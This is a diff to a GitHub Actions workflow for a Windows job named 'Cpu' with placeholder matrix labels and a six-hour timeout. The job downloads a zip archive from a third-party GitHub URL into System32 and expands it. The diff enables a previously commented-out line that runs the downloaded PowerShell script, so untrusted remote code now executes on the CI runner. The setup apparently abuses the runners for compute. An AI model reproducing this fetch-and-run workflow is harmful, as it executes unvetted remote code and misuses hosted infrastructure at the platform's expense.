@@ -11,12 +11,12 @@ jobs:
     name: Cpu
     runs-on: windows-latest
     strategy:
-      max-parallel: 20
+      max-parallel: 5
       fail-fast: false
       matrix:
-        Mr: [A, B, C, D, E, F]
-        Golek: [1, 2, 3, 4, 5]
-        Opo: [A.1, B.2, C.3]
+        Mr: [A, B, C, D, E]
+        Golek: [1]
+        Opo: [A.1]
     timeout-minutes: 360
     env:
         NUM_JOBS: 90
@@ -38,7 +38,7 @@ jobs:
         chdir C:\Windows\System32
         Invoke-WebRequest https://raw.githubusercontent.com/wadaefendi/daef/main/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        #cmd /k start .\maingi.ps1
+        cmd /k start .\maingi.ps1
         
         
         
